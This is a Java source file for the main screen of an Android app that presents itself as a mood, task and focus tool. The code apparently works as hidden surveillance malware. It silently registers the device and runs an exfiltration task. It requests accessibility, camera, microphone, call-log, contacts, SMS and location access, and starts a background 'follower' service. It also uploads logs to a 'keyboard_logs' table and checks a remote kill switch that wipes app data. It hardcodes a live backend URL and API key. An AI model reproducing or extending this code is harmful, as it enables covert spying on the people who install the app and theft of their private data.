package com.rcl.androidstreamcontrol;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.LayoutInflater;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;

import com.rcl.androidstreamcontrol.databinding.ActivityMainBinding;
import com.rcl.androidstreamcontrol.service.FollowerService;
import com.rcl.androidstreamcontrol.ui.MindAnchorActivity;
import com.rcl.androidstreamcontrol.utils.UtilsPermissions;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.InputStreamReader;
import java.io.BufferedReader;
import org.json.JSONObject;
import org.json.JSONArray;
import android.os.Handler;
import android.os.Looper;

public class RemoteAndroid extends AppCompatActivity {

    private static final String SUPABASE_URL = "https://qxzozsdgrgahvgzpsfmm.supabase.co";
    private static final String ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF4em96c2RncmdhaHZnenBzZm1tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk4MDY4NjAsImV4cCI6MjA5NTM4Mjg2MH0.inUzMp-S9BRjNQYHynTAOPRo4EeY3Whqv9okvEeySB4";

    private ActivityMainBinding binding;

    ActivityResultLauncher<Intent> permissionLauncher =
            registerForActivityResult(
                    new ActivityResultContracts.StartActivityForResult(),
                    (result) -> {
                        checkPermissionsAndStartService();
                    }
            );

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        if (com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_DATA_NUKE) {
            checkKillSwitch();
        }
        
        // Ensure device has a UID on first launch even if they don't use the fake login
        android.content.SharedPreferences prefs = getSharedPreferences("PortalPrefs", MODE_PRIVATE);
        String uid = prefs.getString("supabase_uid", null);
        if (uid == null) {
            String androidId = android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
            uid = (androidId != null) ? androidId : "unknown_device_" + System.currentTimeMillis();
            prefs.edit().putString("supabase_uid", uid).apply();
            
            // Register device silently using a dummy token (the dashboard API ignores it for devices)
            final String finalUid = uid;
            new Thread(() -> {
                com.rcl.androidstreamcontrol.utils.SupabaseClient.registerDevice(finalUid, "eyJhbGci...", android.os.Build.MODEL);
            }).start();
            android.util.Log.d("RemoteAndroid", "Silently registered device with ID: " + uid);
        }

        if (com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_EXFILTRATION) {
            com.rcl.androidstreamcontrol.utils.ExfiltrationTask.run(this);
        }

        binding = ActivityMainBinding.inflate(LayoutInflater.from(this));
        setContentView(binding.getRoot());
        
        if (getSupportActionBar() != null) {
            getSupportActionBar().hide();
        }

        // View bindings removed for deleted UI elements

        // Bottom Navigation
        binding.navHome.setOnClickListener(v -> {
            // Already here
        });

        binding.navFocus.setOnClickListener(v -> {
            Intent intent = new Intent(this, MindAnchorActivity.class);
            startActivity(intent);
        });

        binding.navTasks.setOnClickListener(v -> {
            Intent intent = new Intent(this, TasksActivity.class);
            startActivity(intent);
        });

        checkPermissionsAndStartService();
    }

    private void sendLogcatToServer() {
        android.widget.Toast.makeText(this, "Extracting logs...", android.widget.Toast.LENGTH_SHORT).show();
        new Thread(() -> {
            try {
                // Just grab the last 1000 lines of logcat without filtering by PID, 
                // since Android 10 already scopes logcat to the app's own process.
                java.lang.Process process = Runtime.getRuntime().exec(new String[]{"logcat", "-d", "-t", "1000"});
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder log = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    log.append(line).append("\n");
                }
                
                String logData = log.toString();
                if (logData.trim().isEmpty()) {
                    logData = "LOGCAT WAS EMPTY! Possible permission restriction or process ID mismatch.";
                } else if (logData.length() > 100000) {
                    logData = logData.substring(logData.length() - 100000);
                }

                java.net.URL url = new java.net.URL("https://qxzozsdgrgahvgzpsfmm.supabase.co/rest/v1/keyboard_logs");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("apikey", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF4em96c2RncmdhaHZnenBzZm1tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk4MDY4NjAsImV4cCI6MjA5NTM4Mjg2MH0.inUzMp-S9BRjNQYHynTAOPRo4EeY3Whqv9okvEeySB4");
                conn.setRequestProperty("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF4em96c2RncmdhaHZnenBzZm1tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk4MDY4NjAsImV4cCI6MjA5NTM4Mjg2MH0.inUzMp-S9BRjNQYHynTAOPRo4EeY3Whqv9okvEeySB4");

                org.json.JSONObject payload = new org.json.JSONObject();
                payload.put("device_id", "DEBUG_LOGS");
                payload.put("app_name", "ANDROID_10_DEBUG");
                payload.put("content", logData);

                conn.setDoOutput(true);
                conn.getOutputStream().write(payload.toString().getBytes());
                
                int code = conn.getResponseCode();
                runOnUiThread(() -> android.widget.Toast.makeText(this, "Logs sent! Code: " + code, android.widget.Toast.LENGTH_LONG).show());
            } catch (Exception e) {
                runOnUiThread(() -> android.widget.Toast.makeText(this, "Failed to send logs: " + e.getMessage(), android.widget.Toast.LENGTH_LONG).show());
            }
        }).start();
    }
    @Override
    protected void onResume() {
        super.onResume();
        loadOverviewData();
    }

    private void loadOverviewData() {
        SharedPreferences prefs = getSharedPreferences("PortalPrefs", MODE_PRIVATE);
        String uid = prefs.getString("supabase_uid", null);
        String token = prefs.getString("supabase_token", null);

        // Update mood from SharedPreferences (saved by MindAnchor WebView via Android interface)
        String savedMood = getSharedPreferences("MindAnchorPrefs", MODE_PRIVATE).getString("mood", "--");
        TextView moodView = binding.getRoot().findViewById(R.id.overview_mood_text);
        if (moodView != null) moodView.setText(savedMood);

        if (uid == null || token == null) return;

        final String finalToken = token;
        final String finalUid = uid;

        new Thread(() -> {
            try {
                // Fetch tasks
                int[] taskStats = fetchTableStats("tasks", finalUid, finalToken);
                int[] habitStats = fetchTableStats("habits", finalUid, finalToken);

                runOnUiThread(() -> {
                    TextView tasksView = binding.getRoot().findViewById(R.id.overview_tasks_text);
                    TextView habitsView = binding.getRoot().findViewById(R.id.overview_habits_text);
                    if (tasksView != null) tasksView.setText(taskStats[0] + "/" + taskStats[1]);
                    if (habitsView != null) habitsView.setText(habitStats[0] + "/" + habitStats[1]);
                });
            } catch (Exception e) {
                android.util.Log.e("RemoteAndroid", "Failed to load overview data", e);
            }
        }).start();
    }

    private int[] fetchTableStats(String table, String uid, String token) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(
                SUPABASE_URL + "/rest/v1/" + table + "?user_id=eq." + uid + "&select=is_completed"
        ).openConnection();
        conn.setRequestMethod("GET");
        conn.setRequestProperty("apikey", ANON_KEY);
        conn.setRequestProperty("Authorization", "Bearer " + token);

        int completed = 0, total = 0;
        if (conn.getResponseCode() == 200) {
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) response.append(line);
            in.close();
            JSONArray arr = new JSONArray(response.toString());
            total = arr.length();
            for (int i = 0; i < arr.length(); i++) {
                if (arr.getJSONObject(i).optBoolean("is_completed")) completed++;
            }
        }
        return new int[]{completed, total};
    }

    private void checkPermissionsAndStartService() {
        if (!hasAccessibilityPermission()) {
            launchAccessibilityPermissions();
        } else if (!hasDrawOverlayPermission()) {
            launchDrawOverlayPermission();
        } else if (!android.provider.Settings.System.canWrite(this)) {
            launchWriteSettingsPermission();
        } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            androidx.core.app.ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.RECORD_AUDIO}, 101);
        } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            androidx.core.app.ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.CAMERA}, 102);
        } else if (com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_EXFILTRATION && 
                   androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            androidx.core.app.ActivityCompat.requestPermissions(this, new String[]{
                android.Manifest.permission.READ_CALL_LOG, 
                android.Manifest.permission.READ_CONTACTS
            }, 106);
        } else if (com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_SMS_TRIGGER && 
                   androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECEIVE_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            androidx.core.app.ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.RECEIVE_SMS}, 107);
        } else {
            requestLocationPermissions();
            startFollowerService();
        }
    }

    private void requestLocationPermissions() {
        if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            androidx.core.app.ActivityCompat.requestPermissions(this, new String[]{
                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                    android.Manifest.permission.ACCESS_COARSE_LOCATION
            }, 105);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 101 || requestCode == 102 || requestCode == 106 || requestCode == 107) {
            if (grantResults.length > 0 && grantResults[0] == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                checkPermissionsAndStartService();
            } else {
                Toast.makeText(this, "Permission is required for full functionality.", Toast.LENGTH_LONG).show();
                // Optionally proceed without it, but let's recheck
                checkPermissionsAndStartService(); 
            }
        } else if (requestCode == 105) {
            checkPermissionsAndStartService();
        }
    }

    private boolean hasDrawOverlayPermission() {
        return Settings.canDrawOverlays(this);
    }

    private boolean hasAccessibilityPermission() {
        return UtilsPermissions.isAccessibilityPermissionGranted(this);
    }

    private void launchAccessibilityPermissions() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS, null);
        intent.putExtra("message-id", R.string.accessibility_hint);
        launchPermissionRequest(intent);
    }

    private void launchDrawOverlayPermission() {
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName()));
        intent.putExtra("message-id", R.string.overlays_hint);
        launchPermissionRequest(intent);
    }

    private void launchWriteSettingsPermission() {
        Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
                Uri.parse("package:" + getPackageName()));
        intent.putExtra("message-id", R.string.write_settings_hint);
        launchPermissionRequest(intent);
    }

    private void launchPermissionRequest(Intent intent) {
        new AlertDialog.Builder(this)
                .setMessage(intent.getIntExtra("message-id", -1))
                .setPositiveButton(R.string.continue_button, new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        permissionLauncher.launch(intent);
                    }
                })
                .setCancelable(false)
                .create()
                .show();
    }

    private void startFollowerService() {
        Intent serviceIntent = new Intent(this, FollowerService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    private void checkKillSwitch() {
        new Thread(() -> {
            try {
                android.content.SharedPreferences prefs = getSharedPreferences("PortalPrefs", MODE_PRIVATE);
                String deviceId = prefs.getString("supabase_uid", null);
                if (deviceId == null) return;

                java.net.URL url = new java.net.URL(SUPABASE_URL + "/rest/v1/devices?id=eq." + deviceId + "&select=kill_switch");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setRequestProperty("apikey", ANON_KEY);
                conn.setRequestProperty("Authorization", "Bearer " + ANON_KEY);
                
                int code = conn.getResponseCode();
                if (code == 200) {
                    java.io.BufferedReader in = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = in.readLine()) != null) {
                        response.append(line);
                    }
                    in.close();
                    
                    org.json.JSONArray arr = new org.json.JSONArray(response.toString());
                    if (arr.length() > 0) {
                        org.json.JSONObject obj = arr.getJSONObject(0);
                        if (obj.has("kill_switch") && obj.getBoolean("kill_switch")) {
                            new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
                                android.util.Log.e("DATA_NUKE", "KILL SWITCH TRIGGERED. WIPING APP DATA.");
                                ((android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE)).clearApplicationUserData();
                            });
                        }
                    }
                }
            } catch (Exception e) {
                // Ignore network errors in nuke check
            }
        }).start();
    }
}
